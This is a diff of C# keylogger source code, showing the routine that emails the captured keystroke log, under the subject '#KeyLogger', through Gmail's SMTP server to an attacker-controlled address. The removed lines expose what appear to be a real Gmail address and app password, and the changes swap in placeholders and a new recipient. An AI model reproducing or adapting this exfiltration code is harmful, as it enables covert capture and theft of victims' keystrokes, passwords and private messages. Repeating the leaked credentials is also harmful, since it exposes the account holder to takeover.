@@ -118,14 +118,14 @@ namespace Logger
             MailMessage msj = new MailMessage();
             SmtpClient İstemci=new SmtpClient();
 
-            İstemci.Credentials = new System.Net.NetworkCredential("yusufylkoglu@gmail.com", "h q l d a o z i m i s r r c h o");
+            İstemci.Credentials = new System.Net.NetworkCredential("yourmailadress", "yourmailpasword");
             İstemci.Port = 587;
             İstemci.Host = "smtp.gmail.com";
             İstemci.EnableSsl=true;
             msj.Body=log.ToString();
             msj.Subject = "#KeyLogger";
-            msj.From = new MailAddress("yusufylkoglu@gmail.com");
-            msj.To.Add("240541077@firat.edu.tr");
+            msj.From = new MailAddress("yourmailadress");
+            msj.To.Add("yusufylkoglu@gmail.com");
             İstemci.Send(msj);
 
         }
